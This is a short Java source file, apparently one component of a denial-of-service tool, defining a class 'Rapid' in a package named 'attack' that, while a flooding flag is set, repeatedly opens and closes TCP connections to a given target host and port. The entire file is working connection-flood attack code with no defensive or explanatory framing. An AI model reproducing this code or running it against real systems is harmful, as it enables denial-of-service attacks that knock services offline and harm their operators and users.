package attack;

import java.net.Socket;

public class Rapid extends Attack {

	public Rapid(String target, int port) {
		super(target, port);
	}

	public void run() {
		while (Attack.isFlooding()) {
			try {
				Socket socket = new Socket(super.getTarget(), super.getPort());
				socket.close();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
